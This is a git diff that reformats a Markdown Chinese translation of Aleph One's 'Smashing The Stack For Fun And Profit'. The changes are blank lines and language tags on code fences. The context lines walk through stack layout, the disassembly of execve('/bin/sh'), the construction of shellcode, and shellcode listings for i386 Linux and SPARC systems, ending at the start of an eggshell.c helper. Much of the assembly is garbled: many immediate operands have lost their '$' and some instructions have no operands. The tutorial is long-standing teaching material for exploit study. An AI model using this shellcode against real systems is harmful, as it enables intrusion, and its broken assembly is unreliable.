@@ -1,8 +1,11 @@
 # smashing the stack for fun and profit 译文
 
 > 原文：[Smashing The Stack For Fun And Profit](http://phrack.org/issues/49/14.html)
+
 > 日期：2000.12.20
+
 > 作者：[Aleph One](mailto:aleph1@underground.org)
+
 > 译者：[xuzq@chinasafer.com](www.chinasafer.com)
 
 '践踏堆栈'[C语言编程] n. 在许多C语言的实现中,有可能通过写入例程中所声明的数组的结尾部分来破坏可执行的堆栈.所谓'践踏堆栈'使用的代码可以造成例程的返回异常,从而跳到任意的地址.这导致了一些极为险恶的数据相关漏洞(已人所共知).其变种包括堆栈垃圾化(trash the stack),堆栈乱写(scribble the stack),堆栈毁坏(mangle the stack); 术语mung the stack并不使用,因为这从来不是故意造成的.参阅spam; 也请参阅同名的漏洞,胡闹内核(fandango on core),内存泄露(memory leak),优先权丢失(precedence lossage),螺纹滑扣(overrun screw).
@@ -95,7 +98,7 @@ $ gcc -S -o example1.s example1.c
 
 通过查看汇编语言输出, 我们看到对`function()`的调用被翻译成:
 
-```
+```asm
 pushl 
 pushl 
 pushl 
@@ -104,7 +107,7 @@ call function
 
 以从后往前的顺序将`function`的三个参数压入栈中, 然后调用`function()`. 指令call会把指令指针(IP)也压入栈中. 我们把这被保存的IP称为返回地址(RET). 在函数中所做的第一件事情是例程的序幕工作:
 
-```
+```asm
 pushl %ebp
 movl %esp,%ebp
 subl ,%esp
@@ -364,7 +367,7 @@ End of assembler dump.
 
 下面我们看看这里究竟发生了什么事情. 先从main开始研究:
 
-```
+```asm
 0x8000130 : pushl %ebp
 0x8000131 : movl %esp,%ebp
 0x8000133 : subl 0x8,%esp
@@ -380,7 +383,7 @@ char *name[2];
 即2个指向字符串的指针. 指针的长度是一个字, 所以这里保留2个字(8个字节)的
 空间.
 
-```
+```asm
 0x8000136 : movl x80027b8,0xfffffff8(%ebp) ; -0x8(%ebp)
 ```
 
@@ -391,7 +394,7 @@ char *name[2];
 name[0] = "/bin/sh";
 ```
 
-```
+```asm
 0x800013d : movl x0,0xfffffffc(%ebp) ; -0x4(%ebp)
 ```
 
@@ -403,37 +406,37 @@ name[1] = NULL;
 
 对`execve()`的真正调用从下面开始:
 
-```
+```asm
 0x8000144 : pushl x0 ; NULL
 ```
 
 我们把`execve()`的参数以从后向前的顺序压入堆栈中, 这里从`NULL`开始.
 
-```
+```asm
 0x8000146 : leal 0xfffffff8(%ebp),%eax ; name
 ```
 
 把`name[]`的地址放到EAX寄存器中.
 
-```
+```asm
 0x8000149 : pushl %eax
 ```
 
 接着就把`name[]`的地址压入堆栈中.
 
-```
+```asm
 0x800014a : movl 0xfffffff8(%ebp),%eax ; name[0]
 ```
 
 把字串`"/bin/sh"`的地址放到EAX寄存器中
 
-```
+```asm
 0x800014d : pushl %eax
 ```
 
 接着就把字串`"/bin/sh"`的地址压入堆栈中
 
-```
+```asm
 0x800014e : call 0x80002bc <__execve>
 ```
 
@@ -444,7 +447,7 @@ name[1] = NULL;
 软中断跳入内核模式, 有的使用远调用(far call). Linux把传给系统调用的参数保存在
 寄存器里, 并且使用软中断跳入内核模式.
 
-```
+```asm
 0x80002bc <__execve>: pushl %ebp
 0x80002bd <__execve+1>: movl %esp,%ebp
 0x80002bf <__execve+3>: pushl %ebx
@@ -452,31 +455,31 @@ name[1] = NULL;
 
 例程的准备工作.
 
-```
+```asm
 0x80002c0 <__execve+4>: movl xb,%eax
 ```
 
 把`0xb`(十进制的11)放入寄存器EAX中(原文误为堆栈). `0xb`是系统调用表的索引 11就是`execve`.
 
-```
+```asm
 0x80002c5 <__execve+9>: movl 0x8(%ebp),%ebx ; arg0: name[0]
 ```
 
 把`"/bin/sh"`的地址放到寄存器EBX中.
 
-```
+```asm
 0x80002c8 <__execve+12>: movl 0xc(%ebp),%ecx ; arg1: name
 ```
 
 把`name[]`的地址放到寄存器ECX中.
 
-```
+```asm
 0x80002cb <__execve+15>: movl 0x10(%ebp),%edx ; arg2: NULL
 ```
 
 把空指针的地址放到寄存器EDX中.
 
-```
+```asm
 0x80002ce <__execve+18>: int x80
 ```
 
@@ -485,12 +488,19 @@ name[1] = NULL;
 由此可见调用`execve()`也没有什么太多的工作要做, 所有要做的事情总结如下:
 
 a) 把以`NULL`结尾的字串`"/bin/sh"`放到内存某处.
+
 b) 把字串`"/bin/sh"`的地址放到内存某处, 后面跟一个空的长字(null long word).
+
 c) 把`0xb`放到寄存器EAX中.
+
 d) 把字串`"/bin/sh"`的地址放到寄存器EBX中.
+
 e) 把字串`"/bin/sh"`地址的地址放到寄存器ECX中.
+
 (注: 原文d和e步骤把EBX和ECX弄反了)
+
 f) 把空长字的地址放到寄存器EDX中.
+
 g) 执行指令`int x80`.
 
 但是如果`execve()`调用由于某种原因失败了怎么办? 程序会继续从堆栈中读取指令, 这时的堆栈中可能含有随机的数据! 程序执行这样的指令十有八九会core dump. 如果`execve`调用失败我们还是希望程序能够干净地退出. 为此必须在调用`execve`之后加入一个`exit`系统调用. `exit`系统调用在汇编语言看起来象什么呢?
@@ -535,21 +545,31 @@ End of assembler dump.
 系统调用`exit`会把`0x1`放到寄存器EAX中, 在EBX中放置退出码, 并且执行`int 0x80`. 就这些了! 大多数应用程序在退出时返回0, 以表示没有错误. 我们在EBX中也放入0. 现在我们构造shell code的步骤就是这样的了:
 
 a) 把以`NULL`结尾的字串`"/bin/sh"`放到内存某处.
+
 b) 把字串`"/bin/sh"`的地址放到内存某处, 后面跟一个空的长字(null long word).
+
 c) 把`0xb`放到寄存器EAX中.
+
 d) 把字串`"/bin/sh"`的地址放到寄存器EBX中.
+
 e) 把字串`"/bin/sh"`地址的地址放到寄存器ECX中.
+
 (注: 原文d和e步骤把EBX和ECX弄反了)
+
 f) 把空长字的地址放到寄存器EDX中.
+
 g) 执行指令`int x80`.
+
 h) 把`0x1`放到寄存器EAX中.
+
 i) 把`0x0`放到寄存器EBX中.
+
 j) 执行指令`int x80`.
 
 试着把这些步骤变成汇编语言, 把字串放到代码后面. 别忘了在数组后面放上字串
 地址和空字, 我们有如下的代码:
 
-```
+```asm
 movl string_addr,string_addr_addr
 movb x0,null_byte_addr
 movl x0,null_addr
@@ -587,7 +607,7 @@ int x80
 运用上述的修正方法, 并使用相对索引寻址, 我们代码中每条指令的字节数目如下:
 
 
-```
+```asm
 jmp offset-to-call # 2 bytes
 popl %esi # 1 byte
 movl %esi,array-offset(%esi) # 3 bytes
@@ -609,7 +629,7 @@ call offset-to-popl # 5 bytes
 偏量, 我们得到:
 
 
-```
+```asm
 jmp 0x26 # 2 bytes
 popl %esi # 1 byte
 movl %esi,0x8(%esi) # 3 bytes
@@ -725,7 +745,7 @@ $ exit
 
 问题指令： 替代方案：
 
-```
+```asm
 movb x0,0x7(%esi) xorl %eax,%eax
 molv x0,0xc(%esi) movb %eax,0x7(%esi)
                   movl %eax,0xc(%esi)
@@ -1204,7 +1224,7 @@ $
 
 i386/Linux
 
-```
+```asm
 jmp 0x1f
 popl %esi
 movl %esi,0x8(%esi)
@@ -1226,7 +1246,7 @@ call -0x24
 
 SPARC/Solaris
 
-```
+```asm
 sethi 0xbd89a, %l6
 or %l6, 0x16e, %l6
 sethi 0xbdcda, %l7
@@ -1246,7 +1266,7 @@ ta 8
 
 SPARC/SunOS
 
-```
+```asm
 sethi 0xbd89a, %l6
 or %l6, 0x16e, %l6
 sethi 0xbdcda, %l7
@@ -1317,7 +1337,7 @@ unsigned long get_sp(void) {
 
 eggshell.c
 
-```
+```c
 /*
  * eggshell v1.0
  *
